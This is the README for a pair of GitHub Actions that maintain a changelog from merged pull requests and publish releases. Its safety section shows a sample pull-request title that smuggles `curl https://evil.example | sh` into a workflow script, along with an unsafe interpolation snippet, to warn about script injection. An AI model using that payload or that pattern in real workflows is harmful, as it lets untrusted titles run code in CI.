# changelog-actions

Two GitHub Actions that keep a [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) `CHANGELOG.md` up to date:

- **`update`** adds an entry to `## [Unreleased]` for every merged pull request, in the category picked from its labels.
- **`release`** turns `## [Unreleased]` into `## [X.Y.Z] - YYYY-MM-DD`, then tags it and creates a GitHub release with that section as release notes.

Both actions write through the GitHub API: no `actions/checkout`, no git setup.

## Usage

### Update the changelog on every merged PR

```yaml
# .github/workflows/update-changelog.yml
name: Update Changelog

on:
  pull_request_target:
    types: [closed]
    branches: [main]

concurrency:
  group: changelog
  queue: max

jobs:
  update-changelog:
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: DannyvdSluijs/changelog-actions/update@v1
```

A PR titled `Fix validation of x` with the label `bug` becomes:

```markdown
## [Unreleased]

### Fixed
- Fix validation of x ([#123](https://github.com/owner/repo/pull/123))
```

`pull_request_target` is safe here: the action only reads the event payload and never checks out or runs code from the PR.

### Create a release

```yaml
# .github/workflows/release.yml
name: Create Release

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version number (e.g. 7.0.0 or 7.0.0-rc1)'
        required: true
        type: string

concurrency:
  group: changelog
  queue: max

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: DannyvdSluijs/changelog-actions/release@v1
        with:
          version: ${{ inputs.version }}
```

Before writing anything, the action checks that the version is a bare semantic version (no `v` prefix; set `add-v-prefix: true` to tag `v7.0.0`), that `[Unreleased]` has changes, and that neither the changelog section nor the tag already exist. Pre-release versions such as `7.0.0-rc1` become GitHub pre-releases.

## Inputs

### `update`

| Input | Default | Description |
| --- | --- | --- |
| `token` | `${{ github.token }}` | Token used to commit. See [protected branches](#protected-branches). |
| `changelog-path` | `CHANGELOG.md` | Path to the changelog. Created with the standard header if missing. |
| `label-mapping` | see below | YAML mapping of category to label(s). |
| `default-category` | `Changed` | Category for PRs without a mapped label. |
| `entry-template` | `- {title} ([#{number}]({url}))` | A single line starting with a list marker (`- `, `* ` or `+ `). Placeholders: `{title}`, `{number}`, `{url}`, `{author}`. |
| `strip-prefixes` | `false` | Strip Conventional Commit prefixes (`fix:`, `feat(scope):`, …) from the title. |
| `commit-message` | `docs: Update CHANGELOG.md for PR #{number}` | Placeholders: `{number}`, `{url}`, `{author}`. `{title}` is not allowed: GitHub acts on keywords such as `Fixes #12` or `[skip ci]` in commit messages, so a PR title could close issues or skip CI. |
| `committer-name` | `github-actions[bot]` | |
| `committer-email` | `41898282+github-actions[bot]@users.noreply.github.com` | |

Outputs: `category`, `entry`, `entry-file` (path to a file with the entry), `commit-sha`. See [using the outputs safely](#using-the-outputs-safely).

### `release`

| Input | Default | Description |
| --- | --- | --- |
| `version` | *(required)* | Bare semantic version, e.g. `7.0.0` or `7.0.0-rc1`. |
| `token` | `${{ github.token }}` | Token used to commit, tag and release. |
| `changelog-path` | `CHANGELOG.md` | Path to the changelog. |
| `commit-message` | `docs: Prepare release {version}` | |
| `committer-name` | `github-actions[bot]` | Also used as tagger. |
| `committer-email` | `41898282+github-actions[bot]@users.noreply.github.com` | |
| `tag` | `true` | Create an annotated tag. |
| `github-release` | `true` | Create a GitHub release. |
| `add-v-prefix` | `false` | Prefix the tag and release name with `v`, e.g. `v7.0.0`. The `version` input and the changelog heading stay the bare version. |

Outputs: `version`, `tag` (the tag and release name), `notes`, `notes-file` (path to a file with the notes), `commit-sha`, `release-url`. See [using the outputs safely](#using-the-outputs-safely).

## Using the outputs safely

The `entry` and `notes` outputs contain PR titles, which anyone who opens a PR can choose. Treat them as untrusted input.

Never put them in a `run:` script through an expression. GitHub pastes the text into the script before the shell runs, so a title like `x"; curl https://evil.example | sh; echo "` runs as a command:

```yaml
# Unsafe
- run: echo "${{ steps.release.outputs.notes }}" | ./post-to-slack
```

Pass the value through an environment variable, so the shell treats it as data:

```yaml
- run: echo "$NOTES" | ./post-to-slack
  env:
    NOTES: ${{ steps.release.outputs.notes }}
```

Or use the file outputs, so the text never passes through an expression at all:

```yaml
- run: ./post-to-slack < "$NOTES_FILE"
  env:
    NOTES_FILE: ${{ steps.release.outputs.notes-file }}
```

The `update` action also replaces line breaks and control characters in PR titles with a space, so a title cannot add headings to the changelog or start a workflow command in the job log.

## Label mapping

Labels match exactly, ignoring case. When a PR has labels for several categories, the first category in the mapping wins. The default mapping:

```yaml
Added: [enhancement, feature, added]
Changed: [breaking, changed]
Deprecated: [deprecated]
Removed: [removed]
Fixed: [bug, fix, fixed]
Security: [security]
```

To use your own, pass it as a multi-line string. It replaces the default entirely:

```yaml
- uses: DannyvdSluijs/changelog-actions/update@v1
  with:
    label-mapping: |
      Added: [feature]
      Fixed: [bug, regression]
      Security: security
```

Categories are the Keep a Changelog ones: `Added`, `Changed`, `Deprecated`, `Removed`, `Fixed`, `Security`.

## How the changelog is edited

- New entries go on top of their category.
- A missing category heading is inserted in Keep a Changelog order.
- A missing `## [Unreleased]` section is inserted above the first release.
- Re-running the action for the same PR does nothing: if the changelog already has a line that is exactly the rendered entry, no entry is added. Text that merely mentions the PR, such as another entry linking to it, does not count.
- With an `entry-template` without `{number}` or `{url}`, PRs with the same title render the same entry, so only `[Unreleased]` is checked: a PR titled like an already released entry is still added.
- Only the `[Unreleased]` section is rewritten; released sections are never touched. Its layout is normalised to one blank line between categories.

## Concurrency

Put every workflow using these actions in the **same** concurrency group with `queue: max`, as in the examples above. Runs then execute one at a time, first in first out, and a release waits for pending changelog updates.

Without `queue: max` GitHub keeps only one pending run per group and cancels older pending runs, so merging three PRs in quick succession would lose an entry.

As a safety net, the actions write the changelog with the file's `sha`: if the file changed between reading and writing (for example a manual edit at the same moment), the run fails without overwriting anything. Re-run it; the entry is added once.

## Protected branches

The default `GITHUB_TOKEN` cannot push to a protected branch. Pass a token that may bypass the protection, for example a GitHub App installation token where the app is a bypass actor in the branch ruleset.

Set up the app once:

1. Create a GitHub App under **Settings → Developer settings → GitHub Apps → New GitHub App**:
   - Clear **Webhook → Active**; the app needs no events.
   - Under **Repository permissions**, set **Contents** to **Read and write**. Leave everything else at **No access**.
   - Under **Where can this GitHub App be installed?**, pick **Only on this account**.
2. On the app's page, note the **Client ID** and click **Generate a private key**. GitHub downloads a `.pem` file.
3. Click **Install App** and install it on **Only select repositories**: the repositories that use these actions.
4. In each repository, under **Settings → Secrets and variables → Actions**, add:
   - the variable `CHANGELOG_APP_CLIENT_ID` with the Client ID;
   - the secret `CHANGELOG_APP_PRIVATE_KEY` with the full contents of the `.pem` file. Delete the downloaded file afterwards.
5. Under **Settings → Rules → Rulesets**, open the ruleset that protects the branch and add the app to the **Bypass list**. With classic branch protection, add the app to **Allow specified actors to bypass required pull requests** instead. When a ruleset also protects tags and you use the `release` action, add the app to that ruleset's bypass list too.

Then create the token in the workflow and pass it to the action:

```yaml
jobs:
  update-changelog:
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    permissions: {}
    steps:
      - uses: actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510 # v3.3.0
        id: app-token
        with:
          client-id: ${{ vars.CHANGELOG_APP_CLIENT_ID }}
          private-key: ${{ secrets.CHANGELOG_APP_PRIVATE_KEY }}
          permission-contents: write
      - uses: DannyvdSluijs/changelog-actions/update@v1
        with:
          token: ${{ steps.app-token.outputs.token }}
```

`permission-contents: write` limits the token to what the actions need, even when the app has more permissions. Without it, the token gets every permission of the app. Keep this job to these two steps: any other step in it can use a token that may bypass branch protection.

The actions only use the token you pass in, so the job's own `GITHUB_TOKEN` needs no permissions: replace `contents: write` from the usage examples with `permissions: {}`. Otherwise the job holds two tokens that can write to the repository.

## Pinning

The examples use the `v1` tag for readability, but a tag can be moved. Because these actions receive a token that can write to your repository, and often one that may bypass branch protection, pin them to a full commit SHA:

```yaml
- uses: DannyvdSluijs/changelog-actions/update@<full-commit-sha> # v1.0.0
```

Dependabot and Renovate can keep pinned SHAs up to date.

## Development

```sh
npm ci
npm run all   # typecheck, test, build
```

`update/dist` and `release/dist` are committed; CI fails when they are out of date.

## License

[MIT](LICENSE)
